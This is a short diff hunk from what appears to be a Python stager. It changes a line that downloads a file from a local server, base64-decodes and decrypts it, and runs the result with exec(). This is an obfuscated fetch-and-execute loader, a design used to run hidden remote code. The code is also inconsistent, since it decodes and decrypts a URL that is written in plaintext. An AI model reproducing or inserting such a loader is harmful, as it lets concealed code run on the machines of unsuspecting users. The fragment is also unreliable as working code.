@@ -30,4 +30,4 @@ def decrypt(encrypted_content, key):
 
 url = f"http://127.0.0.1:5001/client.py"
 
-exec(decrypt(base64.b64decode(request.urlopen(decrypt(base64.b64decode(url),key).decode('utf-8')+"/client.py").read()),key).decode('utf-8'))
+exec(decrypt(base64.b64decode(request.urlopen(decrypt(base64.b64decode(url),key).decode('utf-8')).read()),key).decode('utf-8'))
